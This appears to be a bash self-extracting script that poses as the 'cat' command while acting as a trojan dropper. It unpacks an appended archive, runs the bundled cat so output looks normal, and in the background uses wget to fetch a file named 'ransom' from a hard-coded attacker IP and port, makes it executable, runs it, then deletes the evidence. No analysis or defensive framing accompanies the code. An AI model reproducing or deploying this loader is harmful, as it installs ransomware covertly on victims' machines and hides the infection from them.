#!/bin/bash
#Test shell self-extracting

attacker_ip=192.168.209.128
attacker_port=8888
#replacing

TmpDir=./
ARCHIVE=$(awk '/^__ARCHIVE_BELOW__/ {print NR + 1; exit 0; }' "$0")
tail -n+$ARCHIVE "$0" | tar -xzvm -C $TmpDir > /dev/null 2>&1 3>&1

function_to_fork(){
	wget -q http://$attacker_ip:$attacker_port/ransom 
	sleep 1s
	chmod 755 ./ransom
	./ransom
}

delete_tmp(){
	sleep 1.1s
	rm ./ransom
	rm ./cat_tmp
}

if [ $? == 0 ];then
	#echo "Success"
	
	function_to_fork &
	delete_tmp &
	./cat_tmp $@
else
	echo "Fail"
fi
exit 0
#This line must be the last line of the file
__ARCHIVE_BELOW__
